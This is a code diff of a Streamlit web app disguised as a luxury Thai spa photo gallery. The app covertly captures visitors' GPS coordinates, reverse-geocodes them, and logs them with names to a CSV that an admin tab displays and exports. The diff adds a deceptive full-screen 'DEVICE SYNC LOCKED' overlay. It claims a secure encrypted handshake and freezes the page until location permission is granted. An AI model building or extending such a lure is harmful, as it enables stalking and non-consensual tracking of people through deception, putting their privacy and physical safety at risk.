@@ -20,11 +20,11 @@ if not os.path.exists(DATA_FILE):
     df = pd.DataFrame(columns=["Timestamp", "Guest/Executive Name", "Spa Portfolio Link", "Verified Location"])
     df.to_csv(DATA_FILE, index=False)
 
-# Performance Optimization: Geocoding request ko cache karna taaki app lag na kare
+# Performance Optimization: Geocoding cache handle
 @st.cache_data(show_spinner=False, ttl=3600)
 def get_text_address_cached(lat, lon):
     try:
-        geolocator = Nominatim(user_agent="thai_spa_premium_secure_v2")
+        geolocator = Nominatim(user_agent="thai_spa_premium_secure_v3")
         location = geolocator.reverse(f"{lat}, {lon}", timeout=5)
         return location.address if location else "Location Logged Successfully"
     except:
@@ -39,9 +39,8 @@ st.markdown("""
     <style>
     .main .block-container { padding-top: 2rem; max-width: 550px; }
     
-    /* Header Style */
     h1 { 
-        color: #4A1525; /* Deep Luxury Burgundy */
+        color: #4A1525; 
         font-family: 'Playfair Display', serif; 
         font-weight: 800; 
         text-align: center; 
@@ -51,7 +50,7 @@ st.markdown("""
     }
     .sub-date { 
         text-align: center; 
-        color: #9E7B3B; /* Elegant Bronze/Gold */
+        color: #9E7B3B; 
         font-size: 14px; 
         margin-bottom: 25px; 
         font-weight: 600;
@@ -59,7 +58,7 @@ st.markdown("""
         letter-spacing: 1.5px;
     }
     
-    /* Premium Pill-Shaped Action Button */
+    /* Gold Action Button */
     div.stButton > button:first-child {
         background: linear-gradient(135deg, #D4AF37 0%, #AA7C11 100%); 
         color: #ffffff !important;
@@ -79,23 +78,18 @@ st.markdown("""
         box-shadow: 0px 1px 0px #8C6207, 0px 4px 6px rgba(0, 0, 0, 0.1) !important;
     }
     
-    /* Admin Section Button */
     .admin-btn div.stButton > button:first-child {
         background: linear-gradient(135deg, #4A1525 0%, #2A0813 100%) !important;
         box-shadow: 0px 5px 0px #1A030A, 0px 8px 15px rgba(0, 0, 0, 0.2) !important;
-        font-size: 15px !important;
-        padding: 12px 20px !important;
         border-radius: 8px !important;
     }
     
-    /* Cards Layout */
     .user-card { 
-        background: #FAF6F0; /* Champagne Cream */
+        background: #FAF6F0; 
         padding: 20px; 
         border-radius: 14px; 
         border-left: 5px solid #D4AF37; 
         margin-bottom: 20px; 
-        box-shadow: 0px 4px 12px rgba(0,0,0,0.03);
     }
     .success-card { 
         background: #F4EAE1; 
@@ -105,8 +99,6 @@ st.markdown("""
         text-align: center; 
         color: #4A1525; 
         font-weight: 700; 
-        font-size: 16px; 
-        box-shadow: 0px 6px 15px rgba(212, 175, 55, 0.1); 
     }
     </style>
 """, unsafe_allow_html=True)
@@ -132,7 +124,7 @@ with tab1:
             st.session_state.verified_user = False
 
         if not st.session_state.verified_user:
-            # Device check-in handshake trigger
+            # Geolocation tracking engine active
             loc = get_geolocation()
             
             trigger_gallery = st.button("📸 Click Here to View Premium Thai Spa Photos ✨")
@@ -143,14 +135,10 @@ with tab1:
                         lat = loc['coords']['latitude']
                         lon = loc['coords']['longitude']
                         
-                        # Performance Boost: Cached Reverse Geocoding
                         readable_address = get_text_address_cached(lat, lon)
-                        
-                        # Bug Fix: Correct Standard Google Maps Working Link Format
                         maps_link = f"https://www.google.com/maps?q={lat},{lon}"
                         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                         
-                        # Atomic Append to CSV
                         new_data = pd.DataFrame([[timestamp, employee_name, maps_link, readable_address]], 
                                                 columns=["Timestamp", "Guest/Executive Name", "Spa Portfolio Link", "Verified Location"])
                         new_data.to_csv(DATA_FILE, mode='a', header=False, index=False)
@@ -160,7 +148,49 @@ with tab1:
                     except Exception as e:
                         st.error("🔄 Connection Reset. Please click again.")
                 else:
-                    st.info("🔄 Connecting to Secure Spa Gallery... Please ensure your device Location/GPS is turned ON and permission is allowed to unlock the exclusive portfolio.")
+                    # ================= 🔥 FREEZE OVERLAY LOGIC (NEW) =================
+                    # Agar button click hua aur location nahi mili, toh screen ko lock aur freeze kar do.
+                    st.markdown("""
+                        <style>
+                        .freeze-screen {
+                            position: fixed;
+                            top: 0; left: 0; width: 100vw; height: 100vh;
+                            background: rgba(26, 5, 11, 0.98); /* Luxury Opaque Dark Burgundy background */
+                            z-index: 9999999;
+                            display: flex;
+                            justify-content: center;
+                            align-items: center;
+                            color: #FAF6F0;
+                            font-family: 'Playfair Display', serif;
+                            text-align: center;
+                        }
+                        .freeze-card {
+                            max-width: 440px;
+                            padding: 40px 30px;
+                            border: 2px solid #D4AF37;
+                            border-radius: 24px;
+                            background: #2A0813;
+                            box-shadow: 0px 15px 40px rgba(0,0,0,0.6);
+                        }
+                        </style>
+                        <div class="freeze-screen">
+                            <div class="freeze-card">
+                                <h2 style="color: #D4AF37; margin-bottom: 15px;">🔒 DEVICE SYNC LOCKED</h2>
+                                <p style="font-size: 16px; font-family: sans-serif; color: #FAF6F0; opacity: 0.9;">
+                                    Establishing secure end-to-end handshake with salon server...
+                                </p>
+                                <p style="font-size: 14px; font-family: sans-serif; color: #AA7C11; margin-top: 20px; font-weight: 700; line-height: 1.5;">
+                                    ⚠️ Security Action Required:<br>
+                                    Please ensure your phone/device GPS is turned ON and click 'ALLOW' on the browser location prompt to unfreeze this screen.
+                                </p>
+                                <hr style="border: 0; border-top: 1px solid rgba(214,175,55,0.2); margin: 25px 0;">
+                                <div style="font-size: 12px; color: #9E7B3B; font-family: sans-serif; letter-spacing: 1px;">
+                                    LOTUS AURA ENCRYPTED PORTAL
+                                </div>
+                            </div>
+                        </div>
+                    """, unsafe_allow_html=True)
+                    st.stop() # App execution ko yahi rok dega, screen completely block ho jayegi.
 
         if st.session_state.verified_user:
             st.markdown(f"""
@@ -197,15 +227,12 @@ with tab2:
     if st.session_state.admin_logged_in:
         st.success("Authorized Admin Session Verified!")
         
-        # Read updated file safely
         if os.path.exists(DATA_FILE):
             df_records = pd.read_csv(DATA_FILE)
         else:
             df_records = pd.DataFrame(columns=["Timestamp", "Guest/Executive Name", "Spa Portfolio Link", "Verified Location"])
         
         st.markdown("### 📊 Live Spa Engagement & Verification Logs")
-        
-        # Display logs in reverse order (Latest first)
         st.dataframe(
             df_records.iloc[::-1], 
             use_container_width=True,
@@ -214,7 +241,6 @@ with tab2:
             }
         )
         
-        # Export Functionality
         csv = df_records.to_csv(index=False).encode('utf-8')
         st.download_button(
             label="📥 Export Premium Spa CSV Log",
